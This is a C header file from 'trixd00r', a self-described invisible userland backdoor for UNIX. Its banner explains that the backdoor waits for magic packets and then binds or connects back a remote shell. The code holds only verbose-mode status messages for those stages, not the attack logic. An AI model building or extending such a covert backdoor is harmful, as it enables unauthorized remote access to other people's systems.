/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          *
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * server/inc/verbose.h                                                        *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/

#ifndef __VERBOSE_H__
#define __VERBOSE_H__


/* verbose mode test and messages */
#define __IF_VERBOSE    if (ctrl->verbose)

#define __VERBOSE_ARGS  __IF_VERBOSE \
    printf("[+] "BLUE"checking arguments"NORM"\n");

#define __VERBOSE_PREPARE   __IF_VERBOSE \
    printf("[+] "BLUE"preparing sniffer"NORM"\n");

#define __VERBOSE_WATCH __IF_VERBOSE \
    printf("[+] "BLUE"watching for magic packet"NORM"\n");

#define __VERBOSE_MAGIC __IF_VERBOSE \
    printf("--- "YELLOW"got magic packet"NORM"\n");

#define __VERBOSE_BIND_TCP  __IF_VERBOSE \
    printf("--- "YELLOW"binding shell on TCP port %u"NORM"\n", shell->port);

#define __VERBOSE_CONNBACK_TCP  __IF_VERBOSE \
    printf("--- "YELLOW"connecting back to %s"NORM"\n", shell->host);

#define __VERBOSE_BIND_UDP  __IF_VERBOSE \
    printf("--- "YELLOW"binding shell on UDP port %u"NORM"\n", shell->port);

#define __VERBOSE_CONNBACK_UDP  __IF_VERBOSE \
    printf("--- "YELLOW"connecting back to %s:%u"NORM"\n", shell->host,\
           shell->port);

#define __VERBOSE_CONNECT_FROM  __IF_VERBOSE \
    printf("--- "YELLOW"ph34r, client %s has connected"NORM"\n", \
           inet_ntop(AF_INET, &shell->cli.sin_addr, buff, sizeof(buff)));

#define __VERBOSE_CONNECT_TO    __IF_VERBOSE \
    printf("--- "YELLOW"ph34r, connected to %s"NORM"\n", shell->host);

#define __VERBOSE_BYEBYE    __IF_VERBOSE \
    printf("--- "YELLOW"got BYEBYE packet :("NORM"\n");

#define __VERBOSE_END __IF_VERBOSE \
    printf("[+] "BLUE"ending trixd00rd"NORM"\n");


#endif

/* EOF */
